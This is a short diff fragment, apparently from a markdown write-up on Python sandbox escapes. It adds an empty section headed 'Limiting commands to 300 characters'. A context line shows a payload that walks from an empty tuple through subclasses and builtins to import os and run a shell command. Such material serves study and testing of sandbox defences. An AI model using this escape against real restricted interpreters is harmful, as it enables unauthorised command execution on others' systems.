@@ -195,3 +195,9 @@ for file_index in range(0,ndir):                             # This will be on a
 ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
 ```
 
+## Limiting commands to 300 characters
+
+```text
+
+```
+
